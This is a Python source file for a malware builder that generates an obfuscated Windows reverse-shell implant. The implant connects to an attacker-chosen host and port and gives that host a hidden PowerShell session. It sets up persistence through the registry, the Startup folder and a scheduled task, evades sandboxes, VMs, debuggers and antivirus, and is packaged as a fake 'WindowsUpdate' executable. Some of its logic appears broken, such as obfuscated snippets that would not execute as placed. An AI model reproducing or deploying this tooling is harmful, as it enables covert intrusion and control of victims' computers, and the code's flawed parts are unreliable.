import random
import string
import base64
import zlib
import marshal
import types
import re
import os
import sys
import time
import hashlib
import ctypes
import platform
import psutil
import winreg
import tempfile
import shutil
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class PayloadGenerator:
    def __init__(self):
        self.encryption_key = Fernet.generate_key()
        self.aes_key = os.urandom(32)
        
    def generate_random_string(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
    def obfuscate_string(self, s):
        # Multiple layers of encoding with variable encoding
        encodings = [
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: base64.b32encode(x.encode()).decode(),
            lambda x: base64.b16encode(x.encode()).decode()
        ]
        
        # Randomly select encoding method
        encoded = random.choice(encodings)(s)
        
        # Add random padding and junk
        padding = self.generate_random_string(random.randint(5, 10))
        junk = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
        return f"{padding}{junk}{encoded}{junk[::-1]}{padding[::-1]}"
        
    def deobfuscate_string(self, s):
        # Remove padding and junk
        pattern = r'[a-zA-Z0-9]+[a-zA-Z]+([A-Za-z0-9+/=]+)[a-zA-Z]+[a-zA-Z0-9]+'
        match = re.search(pattern, s)
        if match:
            encoded = match.group(1)
            try:
                return base64.b64decode(encoded).decode()
            except:
                try:
                    return base64.b32decode(encoded).decode()
                except:
                    return base64.b16decode(encoded).decode()
        return s
        
    def encrypt_payload(self, payload):
        # AES encryption with random IV
        cipher = AES.new(self.aes_key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return f"{iv}:{ct}"
        
    def generate_stealth_payload(self, host, port):
        # Enhanced reverse shell template with more features
        template = '''
import socket,subprocess,os,time,random,string,base64,hashlib,ctypes
from ctypes import windll, wintypes, byref, sizeof, c_buffer
import win32api,win32con,win32security,win32ts,win32net,win32netcon
import win32com.client
import wmi
import sys
import threading
import marshal
import types
import psutil
import platform
import uuid
import winreg
import tempfile
import shutil
from datetime import datetime

def {random_func_name}():
    {obfuscated_anti_analysis_code}
    {obfuscated_socket_code}
    {obfuscated_process_code}
    {obfuscated_persistence_code}
    {obfuscated_anti_vm_code}
    {obfuscated_anti_debug_code}
    {obfuscated_stealth_code}
    {obfuscated_network_code}

if __name__ == '__main__':
    try:
        {random_func_name}()
    except:
        pass
'''
        
        # Generate random function name
        random_func_name = f"_{self.generate_random_string(8)}"
        
        # Enhanced anti-analysis code with sandbox detection
        anti_analysis_code = '''
def check_analysis_environment():
    # Check for common analysis tools
    analysis_tools = [
        "wireshark", "fiddler", "process explorer", "process monitor",
        "procmon", "procexp", "ollydbg", "ida", "x64dbg", "windbg",
        "immunity debugger", "ghidra", "radare2", "cain", "netstat",
        "tcpview", "filemon", "regmon", "cain", "netstat", "autoruns"
    ]
    
    for proc in psutil.process_iter(['name']):
        if any(tool in proc.info['name'].lower() for tool in analysis_tools):
            return True
            
    # Check for common analysis directories
    analysis_dirs = [
        "C:\\\\Program Files\\\\Wireshark",
        "C:\\\\Program Files\\\\Fiddler",
        "C:\\\\Program Files\\\\IDA",
        "C:\\\\Program Files\\\\x64dbg",
        "C:\\\\Program Files\\\\OllyDbg",
        "C:\\\\Program Files\\\\Immunity Inc",
        "C:\\\\Program Files\\\\Radare2"
    ]
    
    for directory in analysis_dirs:
        if os.path.exists(directory):
            return True
            
    # Check for sandbox indicators
    sandbox_indicators = [
        "C:\\\\sample", "C:\\\\malware", "C:\\\\virus",
        "C:\\\\analysis", "C:\\\\sandbox", "C:\\\\cuckoo"
    ]
    
    for indicator in sandbox_indicators:
        if os.path.exists(indicator):
            return True
            
    # Check for common sandbox processes
    sandbox_processes = [
        "cuckoo", "wireshark", "fiddler", "tcpview", "process explorer",
        "process monitor", "procmon", "procexp", "ollydbg", "ida",
        "x64dbg", "windbg", "immunity debugger", "ghidra", "radare2"
    ]
    
    for proc in psutil.process_iter(['name']):
        if any(process in proc.info['name'].lower() for process in sandbox_processes):
            return True
            
    # Check for common sandbox usernames
    sandbox_usernames = [
        "malware", "virus", "sandbox", "cuckoo", "analysis",
        "test", "user", "admin", "administrator"
    ]
    
    if os.getenv('USERNAME').lower() in sandbox_usernames:
        return True
        
    # Check for common sandbox hostnames
    sandbox_hostnames = [
        "malware", "virus", "sandbox", "cuckoo", "analysis",
        "test", "user", "admin", "administrator"
    ]
    
    if platform.node().lower() in sandbox_hostnames:
        return True
        
    return False

if check_analysis_environment():
    sys.exit(0)
'''
        obfuscated_anti_analysis_code = self.obfuscate_string(anti_analysis_code)
        
        # Enhanced socket code with network traffic obfuscation
        socket_code = f'''
def create_encrypted_socket():
    # Create socket with random delays
    time.sleep(random.uniform(0.1, 0.5))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Set socket options for better stealth
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
    
    # Connect with random delay
    time.sleep(random.uniform(0.1, 0.5))
    s.connect(("{host}", {port}))
    return s

def encrypt_data(data):
    # Add random padding to data
    padding = os.urandom(random.randint(1, 10))
    data = padding + data.encode()
    
    # Encrypt with AES
    key = hashlib.sha256(b"secret_key").digest()
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes)

def decrypt_data(encrypted_data):
    # Decrypt with AES
    key = hashlib.sha256(b"secret_key").digest()
    encrypted_data = base64.b64decode(encrypted_data)
    iv = encrypted_data[:16]
    ct = encrypted_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ct), AES.block_size)
    
    # Remove padding
    return decrypted[10:].decode()

s = create_encrypted_socket()
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
'''
        obfuscated_socket_code = self.obfuscate_string(socket_code)
        
        # Enhanced process code with safer process creation
        process_code = '''
def create_stealth_process():
    # Create a hidden process with safer options
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    
    # Use a legitimate-looking process name
    process_name = "svchost.exe" if random.random() > 0.5 else "explorer.exe"
    
    # Create the process with safer options
    p = subprocess.Popen(
        ["cmd.exe", "/c", "powershell.exe", "-WindowStyle", "Hidden", "-NoProfile", "-ExecutionPolicy", "Bypass"],
        stdin=s,
        stdout=s,
        stderr=s,
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
    )
    return p

p = create_stealth_process()
p.wait()
'''
        obfuscated_process_code = self.obfuscate_string(process_code)
        
        # Enhanced persistence with safer methods
        persistence_code = '''
def add_persistence():
    try:
        # Registry persistence (safer method)
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        
        # Startup folder persistence (safer method)
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        if os.path.exists(startup_folder):
            shutil.copy2(sys.executable, os.path.join(startup_folder, "WindowsUpdate.exe"))
        
        # WMI persistence (safer method)
        try:
            wmi_obj = wmi.WMI()
            startup_cmd = f'cmd.exe /c start "" "{sys.executable}"'
            wmi_obj.Win32_Process.Create(
                CommandLine=startup_cmd,
                CurrentDirectory=os.path.dirname(sys.executable)
            )
        except:
            pass
        
        # Scheduled task persistence (safer method)
        try:
            task_name = "WindowsUpdateTask"
            task_cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc onlogon /ru System /f'
            subprocess.run(task_cmd, shell=True, capture_output=True)
        except:
            pass
            
    except:
        pass
'''
        obfuscated_persistence_code = self.obfuscate_string(persistence_code)
        
        # Enhanced network code for better stealth
        network_code = '''
def setup_network_stealth():
    try:
        # Add random delays to network operations
        time.sleep(random.uniform(0.1, 0.5))
        
        # Check for network monitoring tools
        network_tools = [
            "wireshark", "fiddler", "tcpview", "netstat",
            "process explorer", "process monitor", "procmon"
        ]
        
        for proc in psutil.process_iter(['name']):
            if any(tool in proc.info['name'].lower() for tool in network_tools):
                time.sleep(random.uniform(5, 10))
                
        # Check for common network analysis ports
        analysis_ports = [8080, 8888, 9999, 10000]
        for port in analysis_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex(('127.0.0.1', port))
                if result == 0:
                    time.sleep(random.uniform(5, 10))
                sock.close()
            except:
                pass
                
    except:
        pass

setup_network_stealth()
'''
        obfuscated_network_code = self.obfuscate_string(network_code)
        
        # Enhanced anti-VM detection
        anti_vm_code = '''
def check_vm():
    try:
        # Check WMI
        wmi_obj = wmi.WMI()
        for item in wmi_obj.Win32_ComputerSystem():
            if any(x in item.Model.lower() for x in ['virtual', 'vmware', 'vbox', 'qemu']):
                return True
                
        # Check registry
        vm_registry_keys = [
            r"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
            r"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
            r"SYSTEM\\CurrentControlSet\\Services\\VBoxService",
            r"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
            r"SYSTEM\\CurrentControlSet\\Services\\vmci",
            r"SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
            r"SYSTEM\\CurrentControlSet\\Services\\vmx_svga",
            r"SYSTEM\\CurrentControlSet\\Services\\vmware",
            r"SYSTEM\\CurrentControlSet\\Services\\vmdebug",
            r"SYSTEM\\CurrentControlSet\\Services\\vmmouse",
            r"SYSTEM\\CurrentControlSet\\Services\\vmrawdsk",
            r"SYSTEM\\CurrentControlSet\\Services\\vmusb",
            r"SYSTEM\\CurrentControlSet\\Services\\vmvss",
            r"SYSTEM\\CurrentControlSet\\Services\\vmhgfs"
        ]
        
        for key in vm_registry_keys:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                return True
            except:
                continue
                
        # Check for VM-specific processes
        vm_processes = [
            "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
            "VBoxService.exe", "VBoxTray.exe"
        ]
        
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in vm_processes:
                return True
                
        return False
    except:
        return False

if check_vm():
    sys.exit(0)
'''
        obfuscated_anti_vm_code = self.obfuscate_string(anti_vm_code)
        
        # Enhanced anti-debugging
        anti_debug_code = '''
def check_debugger():
    try:
        # Check for debugger
        if windll.kernel32.IsDebuggerPresent():
            return True
            
        # Check for remote debugger
        is_debugger_present = ctypes.c_bool()
        windll.kernel32.CheckRemoteDebuggerPresent(
            windll.kernel32.GetCurrentProcess(),
            ctypes.byref(is_debugger_present)
        )
        if is_debugger_present.value:
            return True
            
        # Check for common debugger windows
        debugger_windows = [
            "x64dbg", "ollydbg", "ida", "windbg", "immunity debugger",
            "ghidra", "radare2", "process hacker", "process explorer"
        ]
        
        def enum_windows_callback(hwnd, windows):
            if windll.user32.IsWindowVisible(hwnd):
                length = windll.user32.GetWindowTextLengthW(hwnd)
                buff = c_buffer(length + 1)
                windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                windows.append(buff.value)
            return True
            
        windows = []
        windll.user32.EnumWindows(enum_windows_callback, windows)
        
        for window in windows:
            if any(debugger in window.lower() for debugger in debugger_windows):
                return True
                
        return False
    except:
        return False

if check_debugger():
    sys.exit(0)
'''
        obfuscated_anti_debug_code = self.obfuscate_string(anti_debug_code)
        
        # Enhanced stealth features
        stealth_code = '''
def apply_stealth_measures():
    try:
        # Hide process window
        hwnd = windll.kernel32.GetConsoleWindow()
        if hwnd:
            windll.user32.ShowWindow(hwnd, 0)
            
        # Modify process name
        current_process = psutil.Process()
        current_process.name = "svchost.exe"
        
        # Clear process command line
        windll.kernel32.SetConsoleTitleW("Windows Update")
        
        # Add random delays
        time.sleep(random.uniform(1, 3))
        
        # Check for security products
        security_products = [
            "avast", "avg", "bitdefender", "kaspersky", "mcafee",
            "norton", "symantec", "trend micro", "windows defender"
        ]
        
        for proc in psutil.process_iter(['name']):
            if any(product in proc.info['name'].lower() for product in security_products):
                time.sleep(random.uniform(5, 10))
                
    except:
        pass

apply_stealth_measures()
'''
        obfuscated_stealth_code = self.obfuscate_string(stealth_code)
        
        # Format the template
        payload = template.format(
            random_func_name=random_func_name,
            obfuscated_anti_analysis_code=obfuscated_anti_analysis_code,
            obfuscated_socket_code=obfuscated_socket_code,
            obfuscated_process_code=obfuscated_process_code,
            obfuscated_persistence_code=obfuscated_persistence_code,
            obfuscated_anti_vm_code=obfuscated_anti_vm_code,
            obfuscated_anti_debug_code=obfuscated_anti_debug_code,
            obfuscated_stealth_code=obfuscated_stealth_code,
            obfuscated_network_code=obfuscated_network_code
        )
        
        # Additional obfuscation
        payload = self.obfuscate_payload(payload)
        
        return payload
        
    def obfuscate_payload(self, payload):
        # Multiple layers of obfuscation
        # 1. Compile and marshal
        code = compile(payload, '<string>', 'exec')
        marshalled = marshal.dumps(code)
        
        # 2. Add junk code
        junk_code = self.generate_junk_code()
        
        # 3. Create wrapper with multiple layers
        wrapper = f'''
import marshal,types,zlib,base64,random,string
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad

{junk_code}

def decrypt_and_execute(encrypted_data):
    # Decrypt the marshalled code
    key = hashlib.sha256(b"secret_key").digest()
    encrypted_data = base64.b64decode(encrypted_data)
    iv = encrypted_data[:16]
    ct = encrypted_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ct), AES.block_size)
    
    # Execute the code
    exec(marshal.loads(decrypted))

# Encrypted and marshalled code
encrypted_code = "{self.encrypt_payload(marshal.dumps(code))}"

# Execute the payload
decrypt_and_execute(encrypted_code)
'''
        
        # 4. Compress the final payload
        compressed = zlib.compress(wrapper.encode())
        encoded = base64.b64encode(compressed).decode()
        
        # 5. Create the final payload with decompression
        final_payload = f'''
import zlib,base64
exec(zlib.decompress(base64.b64decode("{encoded}")).decode())
'''
        
        return final_payload
        
    def generate_junk_code(self):
        # Generate more sophisticated junk code
        junk = []
        for _ in range(random.randint(10, 20)):
            var_name = f"_{self.generate_random_string(8)}"
            value = random.randint(1, 1000)
            operation = random.choice(['+', '-', '*', '/'])
            junk.append(f"{var_name} = {value}")
            junk.append(f"if {var_name} {operation} {value//2}:")
            junk.append(f"    {var_name} = {var_name} {operation} 2")
            junk.append(f"    print({var_name})")
        return "\n".join(junk) + "\n"
        
    def generate_exe(self, payload, output_path):
        # Convert Python payload to executable with enhanced stealth
        try:
            import PyInstaller.__main__
            
            # Create temporary Python file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(payload)
                temp_path = f.name
            
            # Enhanced PyInstaller options for better stealth
            options = [
                temp_path,
                '--onefile',
                '--noconsole',
                '--clean',
                f'--distpath={os.path.dirname(output_path)}',
                f'--workpath={os.path.join(os.path.dirname(output_path), "build")}',
                '--name=WindowsUpdate',
                '--icon=NONE',
                '--uac-admin',
                '--win-private-assemblies',
                '--win-no-prefer-redirects',
                '--key=WindowsUpdate',
                '--add-data=README.md;.',
                '--hidden-import=win32api',
                '--hidden-import=win32con',
                '--hidden-import=win32security',
                '--hidden-import=win32ts',
                '--hidden-import=win32net',
                '--hidden-import=win32netcon',
                '--hidden-import=win32com.client',
                '--hidden-import=wmi',
                '--hidden-import=psutil',
                '--hidden-import=platform',
                '--hidden-import=uuid',
                '--hidden-import=winreg',
                '--hidden-import=tempfile',
                '--hidden-import=shutil',
                '--hidden-import=datetime',
                '--hidden-import=Crypto.Cipher.AES',
                '--hidden-import=Crypto.Util.Padding',
                '--runtime-hook=stealth_hook.py'
            ]
            
            # Create stealth hook
            with open('stealth_hook.py', 'w') as f:
                f.write('''
import os
import sys
import random
import time
import ctypes
from ctypes import windll

def apply_stealth():
    # Hide console window
    hwnd = windll.kernel32.GetConsoleWindow()
    if hwnd:
        windll.user32.ShowWindow(hwnd, 0)
    
    # Add random delay
    time.sleep(random.uniform(1, 3))
    
    # Set process priority
    windll.kernel32.SetPriorityClass(
        windll.kernel32.GetCurrentProcess(),
        0x00000080  # BELOW_NORMAL_PRIORITY_CLASS
    )

apply_stealth()
''')
            
            PyInstaller.__main__.run(options)
            
            # Clean up
            os.unlink(temp_path)
            os.unlink('stealth_hook.py')
            return True
            
        except Exception as e:
            print(f"Error generating executable: {str(e)}")
            return False 